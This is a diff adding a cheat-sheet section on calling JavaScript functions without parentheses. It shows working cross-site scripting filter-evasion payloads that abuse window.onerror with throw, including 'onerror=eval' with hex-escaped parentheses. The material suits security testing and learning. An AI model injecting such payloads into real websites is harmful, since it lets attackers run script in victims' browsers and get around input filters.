@@ -184,4 +184,24 @@ window+'a' // calls alert()
 // toString works the same
 ```
 
+### Calling functions with arguments without parentheses
 
+- The window object has a global handler called onerror `https://developer.mozilla.org/en-US/docs/Web/API/Window/error_event`
+```
+throw new Error('some new error')
+throw 'hey'
+```
+- The throw statement allow you to specify user defined error object but need not to be an object we can supply as string too.
+> below code should be executed on the global context and it will not work on console,we may use this in a online html compiler.
+https://stackoverflow.com/questions/26570331/window-onerror-and-javascript-console-errors
+
+```
+onerror=alert;throw "hey";
+```
+- alert box with `Uncaught hey`
+```
+onerror=eval;
+throw"=alert\x28document.domain\x29";
+```
+- We can use the above payload to execute code and `=` sign is important
+- `throw"alert\x28\x29"` will result in `Uncaught alert()` which will not pop up the alert, so we simply assign the uncaught to the alert to make it work.
